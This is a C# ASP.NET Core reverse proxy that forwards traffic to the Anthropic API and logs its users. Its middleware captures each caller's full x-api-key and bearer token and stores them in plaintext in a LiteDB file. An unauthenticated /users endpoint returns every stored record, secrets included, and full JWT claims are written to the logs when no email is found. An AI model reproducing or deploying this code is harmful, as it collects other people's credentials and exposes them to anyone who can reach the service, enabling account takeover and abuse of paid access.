using System;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Channels;
using System.Threading.Tasks;
using LiteDB;
using Microsoft.AspNetCore.Server.Kestrel.Core;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Serilog;
using MEL = Microsoft.Extensions.Logging;

var workspace = Environment.GetEnvironmentVariable("WORKSPACE_PATH") ?? "/data";
var dbPath = Path.Combine(workspace, "claude-auth.db");
var logPath = Path.Combine(workspace, "logs", "claude-proxy-.log");

Log.Logger = new LoggerConfiguration()
    .MinimumLevel.Information()
    .WriteTo.Console()
    .WriteTo.File(logPath, rollingInterval: RollingInterval.Day)
    .CreateLogger();

try
{
    var builder = WebApplication.CreateBuilder(args);
    builder.Host.UseSerilog();

    builder.Services.Configure<KestrelServerOptions>(options =>
    {
        options.AllowSynchronousIO = true;
    });

    builder.Services
        .AddReverseProxy()
        .LoadFromConfig(builder.Configuration.GetSection("ReverseProxy"));

    builder.Services.AddSingleton<ILiteDatabase>(_ => new LiteDatabase(dbPath));

    var upsertChannel = Channel.CreateUnbounded<UserRecord>(
        new UnboundedChannelOptions { SingleReader = true });
    builder.Services.AddSingleton(upsertChannel);
    builder.Services.AddHostedService<UserUpsertWorker>();

    var app = builder.Build();

    app.Use(async (context, next) =>
    {
        var logger = context.RequestServices.GetRequiredService<ILogger<Program>>();
        var req = context.Request;

        var authType = "None";
        string? email = null;
        string? name = null;
        string? apiKey = null;
        string? anthropicVersion = null;

        if (req.Headers.TryGetValue("anthropic-version", out var versionHeader))
            anthropicVersion = versionHeader.ToString();

        if (req.Headers.TryGetValue("x-api-key", out var keyHeader))
        {
            authType = "API-Key";
            apiKey = keyHeader.ToString();
        }

        if (req.Headers.TryGetValue("Authorization", out var authHeader))
        {
            authType = "Bearer";
            var token = authHeader.ToString().Replace("Bearer ", "");
            (email, name) = TryDecodeJwt(token, logger);
        }

        if (Environment.GetEnvironmentVariable("LOG_TOKEN_FORMAT") == "true"
            && req.Headers.TryGetValue("Authorization", out var rawAuth))
        {
            var raw = rawAuth.ToString().Replace("Bearer ", "");
            var parts = raw.Split('.');
            var masked = raw.Length > 20 ? raw[..10] + "..." + raw[^10..] : "***";
            logger.LogInformation("[token-debug] format: {Parts} parts, length: {Length}, preview: {Preview}",
                parts.Length, raw.Length, masked);
            logger.LogInformation("[token-debug] type: {Type}",
                parts.Length >= 2 ? "JWT (header.payload.signature)" : "opaque token");
        }

        logger.LogInformation("-> {Method} {Path}{Query} [auth={AuthType}, user={User}]",
            req.Method, req.Path, req.QueryString, authType, email ?? "unknown");

        string? bearerToken = null;
        if (req.Headers.TryGetValue("Authorization", out var bearerHeader))
        {
            var raw = bearerHeader.ToString().Replace("Bearer ", "");
            bearerToken = raw.Length > 0 ? raw : null;
        }

        if (email is not null || bearerToken is not null)
        {
            var tokenKey = bearerToken is not null
                ? (bearerToken.Length > 20 ? "token:" + bearerToken[..10] + bearerToken[^10..] : "token:" + bearerToken)
                : null;

            var channel = context.RequestServices.GetRequiredService<Channel<UserRecord>>();
            await channel.Writer.WriteAsync(new UserRecord
            {
                Email = email ?? tokenKey ?? "unknown",
                Name = name,
                ApiKey = apiKey,
                BearerToken = bearerToken,
                AnthropicVersion = anthropicVersion,
                LastUsedUtc = DateTime.UtcNow
            });
        }

        var responseBufferingFeature = context.Features
            .Get<Microsoft.AspNetCore.Http.Features.IHttpResponseBodyFeature>();
        responseBufferingFeature?.DisableBuffering();

        await next();

        logger.LogInformation("<- {StatusCode} {Method} {Path}",
            context.Response.StatusCode, req.Method, req.Path);
    });

    app.MapGet("/health", () => Results.Content("{\"status\":\"ok\",\"target\":\"https://api.anthropic.com\"}", "application/json"));

    app.MapGet("/users", (ILiteDatabase db) =>
    {
        var col = db.GetCollection<UserRecord>("users");
        return Results.Ok(col.FindAll().ToList());
    });

    app.MapReverseProxy();

    Log.Information("Claude proxy starting on http://+:5066");
    Log.Information("Workspace: {Workspace}", workspace);
    Log.Information("Database: {DbPath}", dbPath);
    Log.Information("Logs: {LogPath}", logPath);

    app.Run();
}
catch (Exception ex)
{
    Log.Fatal(ex, "Proxy terminated unexpectedly");
}
finally
{
    Log.CloseAndFlush();
}

static (string? email, string? name) TryDecodeJwt(string token, MEL.ILogger logger)
{
    try
    {
        var parts = token.Split('.');
        if (parts.Length < 2)
            return (null, null);

        var payload = parts[1]
            .Replace('-', '+')
            .Replace('_', '/');
        switch (payload.Length % 4)
        {
            case 2: payload += "=="; break;
            case 3: payload += "="; break;
        }

        var json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));
        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        var email = root.TryGetProperty("email", out var e) ? e.GetString() : null;
        var name = root.TryGetProperty("name", out var n) ? n.GetString()
                 : root.TryGetProperty("sub", out var s) ? s.GetString()
                 : null;

        if (email is null)
            logger.LogInformation("JWT claims (no email found): {Claims}", json);

        return (email, name);
    }
    catch (Exception ex)
    {
        logger.LogWarning(ex, "JWT decode failed");
        return (null, null);
    }
}

public class UserRecord
{
    [BsonId]
    public string Email { get; set; } = default!;
    public string? Name { get; set; }
    public string? ApiKey { get; set; }
    public string? BearerToken { get; set; }
    public string? AnthropicVersion { get; set; }
    public DateTime LastUsedUtc { get; set; }
}

public class UserUpsertWorker : BackgroundService
{
    private readonly Channel<UserRecord> _channel;
    private readonly ILiteDatabase _db;
    private readonly ILogger<UserUpsertWorker> _logger;

    public UserUpsertWorker(Channel<UserRecord> channel, ILiteDatabase db, ILogger<UserUpsertWorker> logger)
    {
        _channel = channel;
        _db = db;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        var col = _db.GetCollection<UserRecord>("users");
        col.EnsureIndex(x => x.Email, unique: true);

        await foreach (var record in _channel.Reader.ReadAllAsync(stoppingToken))
        {
            try
            {
                col.Upsert(record);
                _logger.LogInformation("Upserted user: {Email}", record.Email);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Upsert failed for {Email}", record.Email);
            }
        }
    }
}

// Required for ILogger<Program> in top-level statements
public partial class Program { }
